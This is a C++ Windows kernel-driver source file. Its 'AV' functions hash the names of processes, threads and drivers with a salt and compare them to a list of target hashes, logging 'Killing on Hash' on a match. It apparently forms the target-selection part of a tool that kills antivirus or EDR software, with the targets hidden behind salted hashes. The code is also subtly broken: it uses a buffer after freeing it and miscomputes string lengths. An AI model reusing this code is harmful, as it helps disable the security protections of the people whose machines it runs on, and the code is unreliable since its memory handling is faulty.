#include "includes.h"
#include "modules.h"
#include "nt_structs.h"
#include "log.h"
#include "hooks.h"

bool AV::process_extraction( PEPROCESS process, UINT64 target_hash ) {
    
    UNICODE_STRING* process_image_name{ nullptr };

    if ( !process ) return false;

    auto status = SeLocateProcessImageName( process, &process_image_name );
    if ( !NT_SUCCESS( status ) || !process_image_name->Buffer )
        return false;

    auto* full_path = process_image_name->Buffer;

    size_t len = process_image_name->Length / sizeof( 2 );

    ExFreePool( process_image_name );

    auto* filename_start = modules::FindFilenameStart( full_path, len );

    if ( !filename_start ) return false;

    UINT64 process_hash = hash::salted_hash_string_ci( filename_start, wcslen( filename_start ) );

    for ( auto hash : globals::AV_Hashes ) {
        if ( process_hash == hash ) {
            DbgPrint( "Killing on Hash (PROCESS): %llx", process_hash );
            return true;
        }
    }

    return false;
}

bool AV::thread_extraction( PETHREAD thread, UINT64 target_hash ) {
    
    if ( !thread ) return false;

    PEPROCESS owning_process = IoThreadToProcess( thread );
    
    if ( !owning_process ) return false;

    UNICODE_STRING* process_image_name{ nullptr };

    auto status = SeLocateProcessImageName( owning_process, &process_image_name );
    if ( status || !process_image_name->Buffer )
        return false;

    size_t len = process_image_name->Length / sizeof( 2 );

    auto* full_path = process_image_name->Buffer;

    ExFreePool( process_image_name );

    auto* filename_start = modules::FindFilenameStart( full_path, len );

    if ( !filename_start ) return false;

    UINT64 thread_hash = hash::salted_hash_string_ci( filename_start, wcslen( filename_start ) );

    for ( auto hash : globals::AV_Hashes ) {
        if ( thread_hash == hash ) {
            DbgPrint( "Killing on Hash (THREAD): %llx", thread_hash );
            return true;
        }
    }

    return false;
}


bool AV::driver_name_extraction( DRIVER_OBJECT* driver_object, UINT64 target_hash ) {

    if ( !driver_object )
        return false;

    if ( !driver_object->DriverName.Buffer )
        return false;

    auto* full_path = driver_object->DriverName.Buffer;
    size_t len = driver_object->DriverName.Length / sizeof( 2 );

    auto* filename_start = modules::FindFilenameStart( full_path, len );

    if ( !filename_start )
        return false;

    UINT64 driver_hash = hash::salted_hash_string_ci( filename_start, wcslen( filename_start ) );

    for ( auto hash : globals::AV_Hashes ) {
        if ( driver_hash == hash )
            return true;
    }

    return false;
}
//